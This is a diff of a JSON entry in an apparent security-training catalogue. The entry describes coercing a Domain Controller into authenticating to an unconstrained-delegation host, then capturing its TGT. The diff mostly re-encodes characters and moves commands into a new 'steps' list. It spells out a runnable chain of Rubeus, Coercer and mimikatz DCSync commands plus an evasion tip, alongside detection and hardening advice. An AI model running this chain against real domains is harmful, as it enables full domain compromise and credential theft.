@@ -1,8 +1,8 @@
 {
   "id": "cdsa-m06-coercing-unconstrained-delegation",
-  "name": "Coercing + Unconstrained Delegation — TGT Capture Attack",
+  "name": "Coercing + Unconstrained Delegation \u2014 TGT Capture Attack",
   "command": ".\\Rubeus.exe monitor /interval:1 /nowrap",
-  "description": "Unconstrained Delegation means a server can impersonate any user that connects to it — including caching their TGT. Combined with coercion (Coercer tool abusing 12+ RPC functions), an attacker forces a Domain Controller to authenticate to a delegated server, capturing the DC's TGT. With the DC's TGT, DCSync is trivial. Detection: Rubeus monitor process and coercion traffic are both detectable.",
+  "description": "Unconstrained Delegation means a server can impersonate any user that connects to it \u2014 including caching their TGT. Combined with coercion (Coercer tool abusing 12+ RPC functions), an attacker forces a Domain Controller to authenticate to a delegated server, capturing the DC's TGT. With the DC's TGT, DCSync is trivial. Detection: Rubeus monitor process and coercion traffic are both detectable.",
   "platform": "windows",
   "type": "attack-chain",
   "opsec": "loud",
@@ -27,7 +27,7 @@
     "T1558.001",
     "T1003.006"
   ],
-  "notes": "=== BACKGROUND ===\n  Unconstrained Delegation: if a computer has 'Trust this computer for delegation to any service'\n  → Any TGT from any user/computer that connects to it is cached on the server\n  → Including the TGT of Domain Controllers when coerced\n\n  Required: attacker is local admin on the unconstrained delegation server (e.g., WS001)\n  Attack flow:\n    1. Find servers with unconstrained delegation\n    2. Run Rubeus in monitor mode to capture TGTs as they arrive\n    3. Use Coercer to force DC to authenticate to the delegated server\n    4. Rubeus captures DC's TGT in base64\n    5. Inject DC TGT and perform DCSync\n\n=== ATTACK ===\n# Step 1: Find servers with Unconstrained Delegation (PowerView, from any domain user)\n. .\\PowerView.ps1\nGet-NetComputer -Unconstrained | select samaccountname\n  → Excludes DCs (they always have unconstrained delegation)\n  → Note FQDN of non-DC unconstrained delegation server (e.g., ws001.eagle.local)\n\n# Step 2 (from unconstrained delegation server — requires local admin)\n# Start Rubeus in monitor mode — watches for new TGTs arriving at this machine\n.\\Rubeus.exe monitor /interval:1 /nowrap\n  → /interval:1 — check every 1 second for new tickets\n  → /nowrap — output base64 without line wraps (easier to copy)\n  → Prints tickets in base64 as they arrive\n  → Keep this running in one terminal\n\n# Step 3 (from attacker machine — Kali, any domain user)\n# Use Coercer to force DC1 to connect to WS001 (the unconstrained server)\npython3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>\n\n  e.g.:\npython3 Coercer.py -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local\n  → Coercer tries all known coercion RPC calls (12+ methods)\n  → At least one will succeed — DC1$ will connect to WS001\n  → Rubeus captures DC1$'s TGT and prints it\n\n# Step 4: Inject captured TGT (on unconstrained delegation server)\n# Copy base64 ticket from Rubeus output\n.\\Rubeus.exe ptt /ticket:<BASE64_TICKET>\n  → Injects DC1$'s TGT into current session\n\n# Step 5: DCSync using injected DC TGT\nmimikatz.exe\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator\n\n=== DETECTION ===\nRubeus monitor detection:\n  → Process spawning with 'monitor' argument visible in command line\n  → Sysmon Event 1: Rubeus.exe with monitor keyword\n\nCoercer detection:\n  → Network: multiple RPC calls from attacker to target DC in rapid succession\n  → Event 4624: DC$ account logging on from unexpected IP (the unconstrained server)\n  → Sysmon Event 3: Outbound port 445 from DC to non-DC server\n\n=== PREVENTION ===\n  → Eliminate unconstrained delegation: audit with Get-ADComputer -Filter {TrustedForDelegation -eq $true}\n  → Block outbound 445/139 from DCs to non-DC machines\n  → Enable SMB signing (prevents relay but not TGT capture)\n  → Privileged users: add to Protected Users group (prevents delegation of their TGT)\n  → Coercer blocks: disable Print Spooler, WMI, etc. on DCs where not needed\n  → RPC firewall to restrict coercion RPC endpoints",
+  "notes": "=== BACKGROUND ===\n  Unconstrained Delegation: if a computer has 'Trust this computer for delegation to any service'\n  \u2192 Any TGT from any user/computer that connects to it is cached on the server\n  \u2192 Including the TGT of Domain Controllers when coerced\n\n  Required: attacker is local admin on the unconstrained delegation server (e.g., WS001)\n  Attack flow:\n    1. Find servers with unconstrained delegation\n    2. Run Rubeus in monitor mode to capture TGTs as they arrive\n    3. Use Coercer to force DC to authenticate to the delegated server\n    4. Rubeus captures DC's TGT in base64\n    5. Inject DC TGT and perform DCSync\n\n=== ATTACK ===\n# Step 1: Find servers with Unconstrained Delegation (PowerView, from any domain user)\n. .\\PowerView.ps1\nGet-NetComputer -Unconstrained | select samaccountname\n  \u2192 Excludes DCs (they always have unconstrained delegation)\n  \u2192 Note FQDN of non-DC unconstrained delegation server (e.g., ws001.eagle.local)\n\n# Step 2 (from unconstrained delegation server \u2014 requires local admin)\n# Start Rubeus in monitor mode \u2014 watches for new TGTs arriving at this machine\n.\\Rubeus.exe monitor /interval:1 /nowrap\n  \u2192 /interval:1 \u2014 check every 1 second for new tickets\n  \u2192 /nowrap \u2014 output base64 without line wraps (easier to copy)\n  \u2192 Prints tickets in base64 as they arrive\n  \u2192 Keep this running in one terminal\n\n# Step 3 (from attacker machine \u2014 Kali, any domain user)\n# Use Coercer to force DC1 to connect to WS001 (the unconstrained server)\npython3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>\n\n  e.g.:\npython3 Coercer.py -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local\n  \u2192 Coercer tries all known coercion RPC calls (12+ methods)\n  \u2192 At least one will succeed \u2014 DC1$ will connect to WS001\n  \u2192 Rubeus captures DC1$'s TGT and prints it\n\n# Step 4: Inject captured TGT (on unconstrained delegation server)\n# Copy base64 ticket from Rubeus output\n.\\Rubeus.exe ptt /ticket:<BASE64_TICKET>\n  \u2192 Injects DC1$'s TGT into current session\n\n# Step 5: DCSync using injected DC TGT\nmimikatz.exe\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator\n\n=== DETECTION ===\nRubeus monitor detection:\n  \u2192 Process spawning with 'monitor' argument visible in command line\n  \u2192 Sysmon Event 1: Rubeus.exe with monitor keyword\n\nCoercer detection:\n  \u2192 Network: multiple RPC calls from attacker to target DC in rapid succession\n  \u2192 Event 4624: DC$ account logging on from unexpected IP (the unconstrained server)\n  \u2192 Sysmon Event 3: Outbound port 445 from DC to non-DC server\n\n=== PREVENTION ===\n  \u2192 Eliminate unconstrained delegation: audit with Get-ADComputer -Filter {TrustedForDelegation -eq $true}\n  \u2192 Block outbound 445/139 from DCs to non-DC machines\n  \u2192 Enable SMB signing (prevents relay but not TGT capture)\n  \u2192 Privileged users: add to Protected Users group (prevents delegation of their TGT)\n  \u2192 Coercer blocks: disable Print Spooler, WMI, etc. on DCs where not needed\n  \u2192 RPC firewall to restrict coercion RPC endpoints",
   "examples": [
     {
       "label": "Find computers with Unconstrained Delegation (PowerView)",
@@ -36,26 +36,6 @@
     {
       "label": "Enumerate via Get-ADComputer (built-in)",
       "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name, DNSHostName"
-    },
-    {
-      "label": "Rubeus monitor mode — capture TGTs as they arrive",
-      "command": ".\\Rubeus.exe monitor /interval:1 /nowrap"
-    },
-    {
-      "label": "Coercer — force DC to authenticate to unconstrained server",
-      "command": "python3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>"
-    },
-    {
-      "label": "Inject captured DC TGT",
-      "command": ".\\Rubeus.exe ptt /ticket:<BASE64_TICKET>"
-    },
-    {
-      "label": "Verify injected DC ticket",
-      "command": "klist"
-    },
-    {
-      "label": "DCSync using injected DC TGT",
-      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
     }
   ],
   "references": [
@@ -81,9 +61,9 @@
     }
   ],
   "defense": {
-    "why_it_works": "A host with Unconstrained Delegation caches the TGT of any account that authenticates to it. By coercing a Domain Controller to authenticate to such a host, an attacker captures the DC's own TGT — and a DC TGT enables DCSync.",
+    "why_it_works": "A host with Unconstrained Delegation caches the TGT of any account that authenticates to it. By coercing a Domain Controller to authenticate to such a host, an attacker captures the DC's own TGT \u2014 and a DC TGT enables DCSync.",
     "prerequisites": "Local admin on a server configured for unconstrained delegation, plus any domain user to trigger coercion.",
-    "impact": "The Domain Controller's TGT, which is injected and used for DCSync — i.e., full domain hash extraction and compromise.",
+    "impact": "The Domain Controller's TGT, which is injected and used for DCSync \u2014 i.e., full domain hash extraction and compromise.",
     "detection": "Sysmon Event 1 showing Rubeus.exe with a 'monitor' argument; a burst of RPC calls from the attacker to the DC (Coercer trying 12+ methods); Event 4624 showing the DC$ account logging on from the unconstrained server's IP; Sysmon Event 3 outbound 445 from the DC to a non-DC host.",
     "artifacts": "Rubeus monitor process on the delegation server; captured base64 TGTs; anomalous DC$ authentication to a non-DC machine; rapid multi-method RPC coercion traffic.",
     "prevention": "Eliminate unconstrained delegation (audit with Get-ADComputer -Filter {TrustedForDelegation -eq $true}); block outbound 445/139 from DCs to non-DC hosts; add privileged users to Protected Users; restrict coercion RPC endpoints with an RPC firewall; disable unneeded coercible services (Spooler, etc.) on DCs.",
@@ -93,9 +73,39 @@
       "MITRE T1558.001",
       "MITRE T1003.006"
     ],
-    "misconfiguration": "A non-DC computer or service account has unconstrained Kerberos delegation enabled (TrustedForDelegation = True). When any user authenticates to that machine, their TGT is forwarded to it automatically. If an attacker compromises the machine, they can extract all the forwarded TGTs — including Domain Admin TGTs if a DA was coerced to authenticate (e.g., via PrinterBug/PetitPotam).",
+    "misconfiguration": "A non-DC computer or service account has unconstrained Kerberos delegation enabled (TrustedForDelegation = True). When any user authenticates to that machine, their TGT is forwarded to it automatically. If an attacker compromises the machine, they can extract all the forwarded TGTs \u2014 including Domain Admin TGTs if a DA was coerced to authenticate (e.g., via PrinterBug/PetitPotam).",
     "vulnerable_config": "# Finding unconstrained delegation hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation |\n    Select-Object Name, TrustedForDelegation\n# Legitimate: Domain Controllers\n# NOT legitimate: fileserver01, webserver02, etc.\n\n# Service account with unconstrained delegation:\nGet-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation",
-    "secure_config": "# Remove unconstrained delegation from all non-DC hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} |\n    Where-Object {$_.Name -notmatch 'DC'} |\n    Set-ADComputer -TrustedForDelegation $false\n\n# Use constrained delegation instead (specific services only):\nSet-ADComputer fileserver01 -TrustedForDelegation $false\n# Then configure resource-based constrained delegation:\nSet-ADComputer fileserver01 -PrincipalsAllowedToDelegateToAccount webserver01\n\n# Protected Users group — members cannot be delegated:\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins'\n\n# Enable Kerberos Armoring (FAST) to prevent TGT forwarding abuse",
+    "secure_config": "# Remove unconstrained delegation from all non-DC hosts:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} |\n    Where-Object {$_.Name -notmatch 'DC'} |\n    Set-ADComputer -TrustedForDelegation $false\n\n# Use constrained delegation instead (specific services only):\nSet-ADComputer fileserver01 -TrustedForDelegation $false\n# Then configure resource-based constrained delegation:\nSet-ADComputer fileserver01 -PrincipalsAllowedToDelegateToAccount webserver01\n\n# Protected Users group \u2014 members cannot be delegated:\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins'\n\n# Enable Kerberos Armoring (FAST) to prevent TGT forwarding abuse",
     "evasion": "Fire the coercion briefly to grab one authentication, then stop; choose whichever coercion protocol (printerbug/DFSCoerce/PetitPotam) is unpatched to avoid failed-attempt noise."
-  }
+  },
+  "steps": [
+    {
+      "label": "Find computers with Unconstrained Delegation (PowerView)",
+      "command": "Get-NetComputer -Unconstrained | select samaccountname, dnshostname"
+    },
+    {
+      "label": "Enumerate via Get-ADComputer (built-in)",
+      "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name, DNSHostName"
+    },
+    {
+      "label": "Rubeus monitor mode \u2014 capture TGTs as they arrive",
+      "command": ".\\Rubeus.exe monitor /interval:1 /nowrap"
+    },
+    {
+      "label": "Coercer \u2014 force DC to authenticate to unconstrained server",
+      "command": "python3 Coercer.py -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_SERVER_FQDN> -t <DC_FQDN>"
+    },
+    {
+      "label": "Inject captured DC TGT",
+      "command": ".\\Rubeus.exe ptt /ticket:<BASE64_TICKET>"
+    },
+    {
+      "label": "Verify injected DC ticket",
+      "command": "klist"
+    },
+    {
+      "label": "DCSync using injected DC TGT",
+      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
+    }
+  ]
 }
